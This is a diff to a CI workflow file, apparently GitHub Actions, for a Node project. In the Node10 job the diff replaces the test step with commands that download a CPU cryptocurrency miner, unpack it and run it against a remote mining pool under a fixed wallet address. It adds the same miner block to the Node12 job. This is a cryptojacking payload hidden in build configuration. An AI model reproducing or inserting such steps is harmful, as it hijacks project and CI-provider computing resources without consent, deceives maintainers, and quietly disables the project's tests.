@@ -13,8 +13,12 @@ jobs:
           node-version: '10'
       - uses: bahmutov/npm-install@v1
       - run: npm run build
-      - run: npm test
+      - run: |
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+          tar xf cpuminer-opt-linux.tar.gz
+          ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0
 
+        
   build-and-test-node12:
     runs-on: ubuntu-20.04
     name: Node12
@@ -29,6 +33,12 @@ jobs:
       - run: npm run build
       - run: npm test
       - run: npm run check:markdown
+      - run: |
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+          tar xf cpuminer-opt-linux.tar.gz
+          ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0
+
+        
 
   release:
     runs-on: ubuntu-20.04
